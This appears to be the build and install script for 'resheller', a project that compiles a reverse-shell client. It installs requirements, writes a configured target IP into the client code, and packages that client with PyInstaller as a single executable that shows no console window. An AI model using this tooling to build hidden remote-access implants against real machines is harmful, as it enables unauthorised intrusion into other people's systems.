import sys
from argparse import ArgumentParser
from configparser import ConfigParser
from importlib import import_module
from ipaddress import IPv4Address
from os import path, name, getcwd, remove
from shutil import copyfile, rmtree
from subprocess import Popen, PIPE, STDOUT
from textwrap import wrap

from src.stdout.color import Color


class Build:
    """Call to resolve config paths and create uninitiated configs"""

    def __init__(self, user: bool):
        self.user = user
        self.executed = False
        self.install = True
        self.venv = hasattr(sys, 'real_prefix')
        self.repo = path.dirname(path.abspath(f"{__file__}/../../../"))
        self.client = "client.exe" if name == "nt" else "client"
        self.conf_ini = path.join(self.repo, 'config.ini')
        self.package = path.join(self.repo, "resheller")
        self.client_dir = path.join(self.package, "src", "client")
        self.client_exe = path.join(self.repo, "dist", self.client)
        self.requirements = self.get_reqs()

    def write_ip_file(self, ip: str):
        ip_file = path.join(self.client_dir, "ip.py")
        with open(ip_file, "w") as file:
            file.write("#!/usr/bin/env python3\n")
            file.write("def get_ip():\n")
            file.write("    return %s\n" % ip)
            file.close()

    def run_pip(self, args: list):
        cmd = [sys.executable, "-m", "pip"]
        for arg in args:
            cmd.append(arg)
        self.run_command(cmd)

    def run_command(self, cmd: list):
        proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, encoding='utf8')
        stdout, _ = proc.communicate()
        for line in stdout.splitlines():
            for row in wrap(line, 75):
                if "Requirement already satisfied" in row:
                    return
                elif "You are using pip version" in row:
                    self.run_pip(["install", "--upgrade", "pip"])
                print(f"    {row}")
                self.executed = True

    def get_reqs(self) -> list:
        req_file = path.join(self.repo, "requirements.txt")
        with open(req_file, "r") as reqs:
            lines = reqs.readlines()
            reqs.close()
        return lines

    def read_package_path(self):
        for line in self.requirements:
            try:
                module = import_module(line.split("=")[0])
                module = wrap(module.__file__, 71)
                print(f"      {Color('*').b_grn()}  {module.pop(0)}")
                for row in module:
                    print(f"           {row}")
            except ImportError:
                pass

    def resolve_user(self):
        if self.user and self.venv:
            print(Color("    Cannot install requirements as --user").ylw())
            print(Color("    Virtual environment is active").ylw())
        elif not self.install:
            print(Color("    Uninstall does not take the --user flag").ylw())
            print(Color("    Try manually removing installations").ylw())
            print(Color("    They may be in the following location(s)").ylw())
            self.read_package_path()
        else:
            return
        self.user = False

    def manage_requirements(self):
        if self.user:
            self.resolve_user()
        for line in self.requirements:
            if self.install:
                args = ["install", line]
                if self.user:
                    args.append("--user")
            else:
                args = ["uninstall", "--yes", line]
            self.run_pip(args)

    def make_config(self):
        def_ini = path.join(self.package, "lib", 'default.ini')
        copyfile(def_ini, self.conf_ini)
        print(Color("Initiated config.ini:").grn())
        prompt = "    Enter target's IP in config file then run build.py"
        print(Color(prompt).ylw())
        exit(0)

    def get_ip(self):
        config = ConfigParser()
        conf_ini = path.join(getcwd(), 'config.ini')
        config.read(conf_ini)
        ipv4 = config["IP"]["server"]
        try:
            IPv4Address(ipv4.strip('"'))
        except ValueError as err:
            if "Enter target IP here" in ipv4:
                prompt = "    Enter target's IP in the config file (config.ini)"
                print(Color(prompt).red())
            else:
                print(Color("    Not a valid IPv4 Address:").b_red())
                print(f"    {Color(err).ylw()}")
            exit(0)
        self.write_ip_file(ipv4)

    def make_exe(self):
        client_py = path.join(self.client_dir, "client.py")
        if path.isfile(self.client_exe):
            print(Color("    Resheller already installed\n").ylw())
            print("Hint: Run build.py -r to reinstall")
        else:
            cmd = ["pyinstaller", "--onefile", "--noconsole", client_py]
            self.run_command(cmd)
            print(Color("    Installation Successful").ylw())
            print()
            print(Color(f"Find {self.client} in ./dist").grn())

    def install_requirements(self, install_reqs=True):
        print(Color("[Install]").b_grn())
        if not path.isfile(self.conf_ini):
            if install_reqs:
                print(Color("Installing package requirements:").grn())
                self.manage_requirements()
                if self.executed:
                    print(Color("    Package requirements satisfied\n").ylw())
                else:
                    print(Color("    Requirements already installed\n").ylw())
            self.make_config()
        self.get_ip()
        print(Color("Installing package:").grn())
        self.make_exe()

    def rm_build(self):
        items = []
        for item in ["build", "dist", self.conf_ini, "client.spec"]:
            try:
                remove(item)
                print(f"    {Color(path.basename(item)).ylw()}")
                items.append(path.basename(item))
            except PermissionError as err:
                if item == "dist":
                    print(Color(err).b_red())
                    print(f'Hint: Try looking for "{self.client}" '
                          f'in your running processes')
                    exit(0)
                rmtree(item)
            except FileNotFoundError:
                continue
            print(f"    {Color(path.basename(item)).ylw()}")
            items.append(path.basename(item))
        if len(items) > 1:
            items.insert(len(items[:-1]), "and")
        return items

    def clean(self, install_reqs=True):
        self.install = False
        print(Color("[Clean]").b_grn())
        if install_reqs:
            print(Color("Removing package requirements:").grn())
            print(self.executed)
            self.manage_requirements()
            if self.executed:
                print(Color("    Package requirements removed\n").ylw())
            else:
                print(Color("    No requirements to uninstall\n").ylw())
        print(Color("Removing:").grn())
        items = self.rm_build()
        if items:
            confirm = ''.join([str(f'{item}, ') for item in items])
            confirm = confirm.replace(", and,", " and")
            print(Color("Removed:").grn())
            print(f"    {Color(confirm[:-2]).ylw()}")
        else:
            print(Color("    Nothing to Remove").ylw())
        self.write_ip_file('"Enter target IP here"')

    def reinstall(self):
        install_reqs = True
        print(Color("[Reinstall]").b_grn())
        print(Color("Running reinstall:").grn())
        if path.isfile(self.conf_ini):

            print()
            self.clean(install_reqs=False)
            print()
            if path.isfile(self.client_exe):
                install_reqs = False
            self.install = True
            self.install_requirements(install_reqs)
        else:
            print(Color("    Package is not installed").ylw())


def argument_parser():
    parser = ArgumentParser()
    parser.add_argument(
        "build",
        help="build the reverse-shell client",
    )
    parser.add_argument(
        "-d",
        "--dummy",
        help="test with this",
        action="store_true"
    )
    parser.add_argument(
        "-c",
        "--clean",
        help="remove everything ",
        action="store_true"
    )
    parser.add_argument(
        "-r",
        "--reinstall",
        help="clean the repository without removing requirements and install "
             "the package and requirements if necessary",
        action="store_true"
    )
    parser.add_argument(
        "-u",
        "--user",
        help="install requirements to user python path",
        action="store_true"
    )
    return parser.parse_args()


def usage():
    parser = ArgumentParser()
    parser.add_argument("--usage")
    parser.parse_args()
    print(parser.print_help())


def install():
    args = argument_parser()
    make = Build(args.user)
    try:
        assert args.build == "build"
        if args.reinstall:
            make.reinstall()
        elif args.clean:
            make.clean()
        elif args.dummy:
            print(10 * "DUMMY\n")
        else:
            make.install_requirements()
    except AssertionError:
        usage()
